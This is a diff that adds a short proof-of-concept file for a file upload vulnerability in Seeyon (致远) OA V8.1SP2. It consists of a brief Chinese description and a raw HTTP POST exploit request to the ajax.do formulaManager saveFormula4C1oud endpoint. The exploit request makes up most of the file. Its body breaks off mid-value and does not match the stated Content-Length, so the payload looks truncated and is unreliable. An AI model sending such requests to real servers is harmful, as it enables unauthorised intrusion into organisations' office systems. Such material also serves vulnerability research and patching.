@@ -1,0 +1,15 @@
+# 致远OA_V8.1SP2文件上传漏洞
+# 致远 OA（Office Anywhere）是一款办公自动化软件，用于企业内部协作、流程管理等。在致远 OA V8.1SP2 版本中存在文件上传漏洞，这种漏洞允许攻击者上传恶意文件到服务器，可能导致服务器受到攻击或被入侵。
+POST /seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud&acid=80015024&bid=hd_tag_m8mv2479 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2479
+RM-PRO-Token: 49c644560d55fdbd23789ade9145bc39
+RM-PRO-Time: 1742808367231
+Expect: 100-continue
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML
+Accept-Language: zh-CN,zh;q=0.9
+Content-Length: 581
+Content-Type: application/x-www-form-urlencoded
+
+arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":",\"sample\",\"I"}
